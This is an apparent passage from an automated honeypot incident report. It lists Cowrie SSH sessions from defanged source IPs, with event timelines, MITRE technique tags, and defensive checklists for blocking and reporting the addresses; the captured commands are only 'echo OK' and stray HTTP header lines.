| **Source IP** | `182.135.63[.]175` |
| **First Seen** | 2026-07-16 09:10 |
| **Last Seen** | 2026-07-16 09:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:10:07` | `cowrie.session.connect` |
| `2026-07-16 09:10:08` | `cowrie.client.version` |
| `2026-07-16 09:10:08` | `cowrie.client.kex` |
| `2026-07-16 09:10:10` | `cowrie.login.success` |
| `2026-07-16 09:10:11` | `cowrie.direct-tcpip.request` |
| `2026-07-16 09:10:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.135.63[.]175` to AbuseIPDB if not already reported
- [ ] Block `182.135.63[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a387affc864a

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-07-16 09:19 |
| **Last Seen** | 2026-07-16 09:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:19:19` | `cowrie.session.connect` |
| `2026-07-16 09:19:20` | `cowrie.client.version` |
| `2026-07-16 09:19:20` | `cowrie.client.kex` |
| `2026-07-16 09:19:22` | `cowrie.login.success` |
| `2026-07-16 09:19:23` | `cowrie.direct-tcpip.request` |
| `2026-07-16 09:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f84e092a1036

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-07-16 09:19 |
| **Last Seen** | 2026-07-16 09:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:19:33` | `cowrie.session.connect` |
| `2026-07-16 09:19:34` | `cowrie.client.version` |
| `2026-07-16 09:19:34` | `cowrie.client.kex` |
| `2026-07-16 09:19:36` | `cowrie.login.success` |
| `2026-07-16 09:19:37` | `cowrie.direct-tcpip.request` |
| `2026-07-16 09:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6a37dc554bd

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]41` |
| **First Seen** | 2026-07-16 09:25 |
| **Last Seen** | 2026-07-16 09:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:25:49` | `cowrie.session.connect` |
| `2026-07-16 09:25:49` | `cowrie.client.version` |
| `2026-07-16 09:25:49` | `cowrie.client.kex` |
| `2026-07-16 09:25:51` | `cowrie.login.success` |
| `2026-07-16 09:25:51` | `cowrie.direct-tcpip.request` |
| `2026-07-16 09:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a530cf0e5168

| Field | Detail |
|---|---|
| **Source IP** | `27.39.130[.]144` |
| **First Seen** | 2026-07-16 09:26 |
| **Last Seen** | 2026-07-16 09:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:26:01` | `cowrie.session.connect` |
| `2026-07-16 09:26:01` | `cowrie.client.version` |
| `2026-07-16 09:26:01` | `cowrie.client.kex` |
| `2026-07-16 09:26:03` | `cowrie.login.success` |
| `2026-07-16 09:26:04` | `cowrie.direct-tcpip.request` |
| `2026-07-16 09:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.39.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `27.39.130[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0289d8a7d41b

| Field | Detail |
|---|---|
| **Source IP** | `46.101.9[.]55` |
| **First Seen** | 2026-07-16 09:41 |
| **Last Seen** | 2026-07-16 09:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:41:06` | `cowrie.session.connect` |
| `2026-07-16 09:41:07` | `cowrie.client.version` |
| `2026-07-16 09:41:07` | `cowrie.client.kex` |
| `2026-07-16 09:41:08` | `cowrie.login.success` |
| `2026-07-16 09:41:08` | `cowrie.direct-tcpip.request` |
| `2026-07-16 09:41:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `46.101.9[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-946b2f8c7eb0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 09:41 |
| **Last Seen** | 2026-07-16 09:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:41:18` | `cowrie.session.connect` |
| `2026-07-16 09:41:18` | `cowrie.client.version` |
| `2026-07-16 09:41:18` | `cowrie.client.kex` |
| `2026-07-16 09:41:19` | `cowrie.login.success` |
| `2026-07-16 09:41:20` | `cowrie.session.params` |
| `2026-07-16 09:41:20` | `cowrie.command.input` |
| `2026-07-16 09:41:20` | `cowrie.log.closed` |
| `2026-07-16 09:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e2946c6296a

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-16 09:43 |
| **Last Seen** | 2026-07-16 09:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:43:46` | `cowrie.session.connect` |
| `2026-07-16 09:43:46` | `cowrie.client.version` |
| `2026-07-16 09:43:46` | `cowrie.client.kex` |
| `2026-07-16 09:43:47` | `cowrie.login.success` |
| `2026-07-16 09:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7332878a2ccd

| Field | Detail |
|---|---|
| **Source IP** | `62.201.228[.]210` |
| **First Seen** | 2026-07-16 09:47 |
| **Last Seen** | 2026-07-16 09:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:47:28` | `cowrie.session.connect` |
| `2026-07-16 09:47:29` | `cowrie.client.version` |
| `2026-07-16 09:47:29` | `cowrie.client.kex` |
| `2026-07-16 09:47:30` | `cowrie.login.success` |
| `2026-07-16 09:47:30` | `cowrie.direct-tcpip.request` |
| `2026-07-16 09:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.228[.]210` to AbuseIPDB if not already reported
- [ ] Block `62.201.228[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8385ff17eaba

| Field | Detail |
|---|---|
| **Source IP** | `61.185.30[.]170` |
| **First Seen** | 2026-07-16 09:57 |
| **Last Seen** | 2026-07-16 09:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:57:07` | `cowrie.session.connect` |
| `2026-07-16 09:57:08` | `cowrie.client.version` |
| `2026-07-16 09:57:08` | `cowrie.client.kex` |
| `2026-07-16 09:57:11` | `cowrie.login.success` |
| `2026-07-16 09:57:12` | `cowrie.direct-tcpip.request` |
| `2026-07-16 09:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.185.30[.]170` to AbuseIPDB if not already reported
- [ ] Block `61.185.30[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c8b092c7c15

| Field | Detail |
|---|---|
| **Source IP** | `188.226.132[.]113` |
| **First Seen** | 2026-07-16 09:57 |
| **Last Seen** | 2026-07-16 09:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:57:16` | `cowrie.session.connect` |
| `2026-07-16 09:57:17` | `cowrie.client.version` |
| `2026-07-16 09:57:17` | `cowrie.client.kex` |
| `2026-07-16 09:57:17` | `cowrie.login.success` |
| `2026-07-16 09:57:17` | `cowrie.direct-tcpip.request` |
| `2026-07-16 09:57:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.226.132[.]113` to AbuseIPDB if not already reported
- [ ] Block `188.226.132[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a263ddf462f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 09:57 |
| **Last Seen** | 2026-07-16 09:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 09:57:29` | `cowrie.session.connect` |
| `2026-07-16 09:57:29` | `cowrie.client.version` |
| `2026-07-16 09:57:29` | `cowrie.client.kex` |
| `2026-07-16 09:57:29` | `cowrie.login.success` |
| `2026-07-16 09:57:30` | `cowrie.session.params` |
| `2026-07-16 09:57:30` | `cowrie.command.input` |
| `2026-07-16 09:57:30` | `cowrie.log.closed` |
| `2026-07-16 09:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f2a0189bf6b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-16 10:09 |
| **Last Seen** | 2026-07-16 10:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:09:21` | `cowrie.session.connect` |
| `2026-07-16 10:09:21` | `cowrie.client.version` |
| `2026-07-16 10:09:21` | `cowrie.client.kex` |
| `2026-07-16 10:09:22` | `cowrie.login.success` |
| `2026-07-16 10:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fe4dedb4fc0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-16 10:09 |
| **Last Seen** | 2026-07-16 10:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:09:21` | `cowrie.session.connect` |
| `2026-07-16 10:09:21` | `cowrie.client.version` |
| `2026-07-16 10:09:21` | `cowrie.client.kex` |
| `2026-07-16 10:09:22` | `cowrie.login.success` |
| `2026-07-16 10:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86d1d3ea0623

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-16 10:09 |
| **Last Seen** | 2026-07-16 10:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:09:30` | `cowrie.session.connect` |
| `2026-07-16 10:09:31` | `cowrie.client.version` |
| `2026-07-16 10:09:31` | `cowrie.client.kex` |
| `2026-07-16 10:09:33` | `cowrie.login.success` |
| `2026-07-16 10:09:34` | `cowrie.direct-tcpip.request` |
| `2026-07-16 10:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce5381bc6b44

| Field | Detail |
|---|---|
| **Source IP** | `45.79.128[.]205` |
| **First Seen** | 2026-07-16 10:21 |
| **Last Seen** | 2026-07-16 10:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:21:43` | `cowrie.session.connect` |
| `2026-07-16 10:21:43` | `cowrie.login.success` |
| `2026-07-16 10:21:43` | `cowrie.session.params` |
| `2026-07-16 10:21:43` | `cowrie.command.input` |
| `2026-07-16 10:21:43` | `cowrie.command.input` |
| `2026-07-16 10:21:43` | `cowrie.command.failed` |
| `2026-07-16 10:21:43` | `cowrie.command.input` |
| `2026-07-16 10:21:43` | `cowrie.command.failed` |
| `2026-07-16 10:21:43` | `cowrie.command.input` |
| `2026-07-16 10:21:43` | `cowrie.log.closed` |
| `2026-07-16 10:21:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.79.128[.]205` to AbuseIPDB if not already reported
- [ ] Block `45.79.128[.]205` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eee5aef4ac83

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]164` |
| **First Seen** | 2026-07-16 10:25 |
| **Last Seen** | 2026-07-16 10:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:25:41` | `cowrie.session.connect` |
| `2026-07-16 10:25:42` | `cowrie.client.version` |
| `2026-07-16 10:25:42` | `cowrie.client.kex` |
| `2026-07-16 10:25:43` | `cowrie.login.success` |
| `2026-07-16 10:25:44` | `cowrie.direct-tcpip.request` |
| `2026-07-16 10:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]164` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f41fc6ef9bb

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]240` |
| **First Seen** | 2026-07-16 10:25 |
| **Last Seen** | 2026-07-16 10:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:25:54` | `cowrie.session.connect` |
| `2026-07-16 10:25:54` | `cowrie.client.version` |
| `2026-07-16 10:25:54` | `cowrie.client.kex` |
| `2026-07-16 10:25:56` | `cowrie.login.success` |
| `2026-07-16 10:25:57` | `cowrie.direct-tcpip.request` |
| `2026-07-16 10:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]240` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e4c7cfe0851

| Field | Detail |
|---|---|
| **Source IP** | `103.67.152[.]201` |
| **First Seen** | 2026-07-16 10:31 |
| **Last Seen** | 2026-07-16 10:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:31:18` | `cowrie.session.connect` |
| `2026-07-16 10:31:19` | `cowrie.client.version` |
| `2026-07-16 10:31:19` | `cowrie.client.kex` |
| `2026-07-16 10:31:21` | `cowrie.login.success` |
| `2026-07-16 10:31:22` | `cowrie.direct-tcpip.request` |
| `2026-07-16 10:31:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.152[.]201` to AbuseIPDB if not already reported
- [ ] Block `103.67.152[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da38ca8b4b6d

| Field | Detail |
|---|---|
| **Source IP** | `119.152.102[.]54` |
| **First Seen** | 2026-07-16 10:31 |
| **Last Seen** | 2026-07-16 10:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:31:32` | `cowrie.session.connect` |
| `2026-07-16 10:31:32` | `cowrie.client.version` |
| `2026-07-16 10:31:32` | `cowrie.client.kex` |
| `2026-07-16 10:31:33` | `cowrie.login.success` |
| `2026-07-16 10:31:34` | `cowrie.direct-tcpip.request` |
| `2026-07-16 10:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.152.102[.]54` to AbuseIPDB if not already reported
- [ ] Block `119.152.102[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73cd94982f31

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 10:32 |
| **Last Seen** | 2026-07-16 10:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:32:03` | `cowrie.session.connect` |
| `2026-07-16 10:32:03` | `cowrie.client.version` |
| `2026-07-16 10:32:03` | `cowrie.client.kex` |
| `2026-07-16 10:32:04` | `cowrie.login.success` |
| `2026-07-16 10:32:04` | `cowrie.session.params` |
| `2026-07-16 10:32:04` | `cowrie.command.input` |
| `2026-07-16 10:32:05` | `cowrie.log.closed` |
| `2026-07-16 10:32:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78f27d1b7e77

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-07-16 10:37 |
| **Last Seen** | 2026-07-16 10:37 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:37:33` | `cowrie.session.connect` |
| `2026-07-16 10:37:34` | `cowrie.client.version` |
| `2026-07-16 10:37:34` | `cowrie.client.kex` |
| `2026-07-16 10:37:39` | `cowrie.login.success` |
| `2026-07-16 10:37:40` | `cowrie.direct-tcpip.request` |
| `2026-07-16 10:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75eca8f4e710

| Field | Detail |
|---|---|
| **Source IP** | `34.29.104[.]32` |
| **First Seen** | 2026-07-16 10:37 |
| **Last Seen** | 2026-07-16 10:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:37:45` | `cowrie.session.connect` |
| `2026-07-16 10:37:45` | `cowrie.client.version` |
| `2026-07-16 10:37:45` | `cowrie.client.kex` |
| `2026-07-16 10:37:46` | `cowrie.login.success` |
| `2026-07-16 10:37:47` | `cowrie.direct-tcpip.request` |
| `2026-07-16 10:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.29.104[.]32` to AbuseIPDB if not already reported
- [ ] Block `34.29.104[.]32` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0e91079a670

| Field | Detail |
|---|---|
| **Source IP** | `101.13.1[.]58` |
| **First Seen** | 2026-07-16 10:41 |
| **Last Seen** | 2026-07-16 10:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:41:01` | `cowrie.session.connect` |
| `2026-07-16 10:41:02` | `cowrie.client.version` |
| `2026-07-16 10:41:02` | `cowrie.client.kex` |
| `2026-07-16 10:41:04` | `cowrie.login.success` |
| `2026-07-16 10:41:05` | `cowrie.direct-tcpip.request` |
| `2026-07-16 10:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.1[.]58` to AbuseIPDB if not already reported
- [ ] Block `101.13.1[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c171092bceb4

| Field | Detail |
|---|---|
| **Source IP** | `61.145.181[.]7` |
| **First Seen** | 2026-07-16 10:41 |
| **Last Seen** | 2026-07-16 10:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:41:10` | `cowrie.session.connect` |
| `2026-07-16 10:41:11` | `cowrie.client.version` |
| `2026-07-16 10:41:11` | `cowrie.client.kex` |
| `2026-07-16 10:41:13` | `cowrie.login.success` |
| `2026-07-16 10:41:14` | `cowrie.direct-tcpip.request` |
| `2026-07-16 10:41:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.181[.]7` to AbuseIPDB if not already reported
- [ ] Block `61.145.181[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36155841b792

| Field | Detail |
|---|---|
| **Source IP** | `47.254.214[.]117` |
| **First Seen** | 2026-07-16 10:41 |
| **Last Seen** | 2026-07-16 10:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: curl/7.64.1, Accept: */*` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 10:41:17` | `cowrie.session.connect` |
| `2026-07-16 10:41:17` | `cowrie.login.success` |
| `2026-07-16 10:41:17` | `cowrie.session.params` |
| `2026-07-16 10:41:17` | `cowrie.command.input` |
| `2026-07-16 10:41:17` | `cowrie.command.failed` |
| `2026-07-16 10:41:17` | `cowrie.command.input` |
| `2026-07-16 10:41:17` | `cowrie.command.failed` |
| `2026-07-16 10:41:17` | `cowrie.command.input` |
| `2026-07-16 10:41:20` | `cowrie.log.closed` |
| `2026-07-16 10:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.254.214[.]117` to AbuseIPDB if not already reported
